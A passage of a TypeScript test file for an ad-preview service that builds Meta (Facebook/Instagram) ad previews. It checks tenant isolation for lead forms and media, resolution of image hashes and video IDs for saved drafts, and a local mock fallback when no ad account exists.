    expect((await post({ spec: { ...igSpec(), goal: "engagement", source: "ig_media", format: "existing_post", instagramUserId: null, igMediaId: "17900000000000001" }, placements: ["facebook_feed"] })).status).toBe(400);
    fake.db.seed("leadForm", { id: "lf_own", tenantId: T, pageAssetId: "page_asset", metaFormId: "777000111" }, { id: "lf_x", tenantId: "t_other", pageAssetId: "page_x", metaFormId: "777000222" });
    const lead = { ...igSpec(), goal: "lead_form", link: null };
    expect((await post({ spec: { ...lead, leadFormId: "777000222" }, placements: ["facebook_feed"] })).status).toBe(400);
    expect((await post({ spec: { ...lead, leadFormId: "777000999" }, placements: ["facebook_feed"] })).status).toBe(400);
    expect(previewCalls(current.fake)).toHaveLength(0);
    // Its own Page's post and its own registered form preview as usual.
    expect((await post({ spec: { ...boost, promotableId: `${FAKE_PAGE_ID}_5550001` }, placements: ["facebook_feed"] })).status).toBe(200);
    expect((await post({ spec: { ...lead, leadFormId: "777000111" }, placements: ["facebook_feed"] })).status).toBe(200);
  });

  it("previews a saved promote draft with its AdMedia as Meta's preview (P1), hashes and video ids resolved as launch sends them", async () => {
    process.env.PROMOTE_ENABLED = "on";
    const base = { pageId: FAKE_PAGE_ID, instagramId: FAKE_IG_ID, message: "Diwali sale", link: "https://shop.example.com/diwali" };
    fake.db.seed("adCampaign", { id: "c_promo", tenantId: T, adAccountAssetId: "ad_asset", template: "traffic" });
    fake.db.seed("adSet", { id: "s_promo", tenantId: T, campaignId: "c_promo", targeting: { placements: ["facebook_feed", "instagram_feed"] } });
    const ad = (id: string, format: string, creative: Record<string, unknown>) => ({ id, tenantId: T, adSetId: "s_promo", name: `Ad ${id}`, status: "draft", format, createdAt: new Date(T0), creative: { ...base, format, ...creative } });
    fake.db.seed(
      "ad",
      ad("a_img", "single_image", { media: { feed: "m_img" } }),
      ad("a_car", "carousel", { cards: [{ mediaId: "m_img", headline: "Sarees", link: "https://shop.example.com/s" }, { mediaId: "m_vid", headline: "Kurtas", link: "https://shop.example.com/k" }] }),
      ad("a_wait", "single_image", { media: { feed: "m_wait" } }),
      ad("a_theirs", "single_image", { media: { feed: "m_theirs" } }),
    );
    const media = (id: string, over: Record<string, unknown>) => ({ id, tenantId: T, adAccountAssetId: "ad_asset", kind: "image", status: "ready", metaImageHash: null, metaVideoId: null, metaThumbHash: null, ...over });
    fake.db.seed(
      "adMedia",
      media("m_img", { metaImageHash: "img_hash_1" }),
      media("m_vid", { kind: "video", metaVideoId: "120000000000001", metaThumbHash: "thumb_hash_1" }),
      media("m_wait", { status: "processing" }),
      media("m_theirs", { tenantId: "t_other", metaImageHash: "their_hash" }),
    );
    const creativeOf = () => String(previewCalls(current.fake).at(-1)?.query.creative ?? "");

    const single = (await (await post({ draftId: "c_promo", adId: "a_img", placements: ["facebook_feed"] })).json()) as { call: string; previews: { source: string }[] };
    expect([single.call, single.previews[0].source]).toEqual(["P1", "meta"]);
    expect(creativeOf()).toContain('"image_hash":"img_hash_1"');
    expect(creativeOf()).not.toContain("m_img");

    const carousel = (await (await post({ draftId: "c_promo", adId: "a_car", placements: ["facebook_feed"] })).json()) as { call: string; previews: { source: string }[] };
    expect([carousel.call, carousel.previews[0].source]).toEqual(["P1", "meta"]);
    expect(creativeOf()).toContain('"video_id":"120000000000001"');
    expect(creativeOf()).toContain('"image_hash":"thumb_hash_1"');
    expect(previewCalls(current.fake)).toHaveLength(2);

    // Media still processing, or another workspace's row: the mock, with no Meta call.
    for (const adId of ["a_wait", "a_theirs"]) {
      const res = (await (await post({ draftId: "c_promo", adId, placements: ["facebook_feed"] })).json()) as { previews: { source: string; reason: string }[] };
      expect(res.previews[0], adId).toMatchObject({ source: "local", reason: "incomplete" });
    }
    expect(previewCalls(current.fake)).toHaveLength(2);
  });

  it("without a spending ad account the spec still previews, as the local mock", async () => {
    fake.db.reset();
    fake.db.seed("metaAsset", { id: "page_asset", tenantId: T, type: "page", externalId: FAKE_PAGE_ID });
    const res = await previewsForActor({ userId: "u_admin", tenantId: T, role: "admin" }, { spec: igSpec({ instagramUserId: null, name: "No account" }), placements: ["facebook_feed"] });
    expect(res.previews[0]).toMatchObject({ source: "local", approximate: true, reason: "no_ad_account" });
  });
});
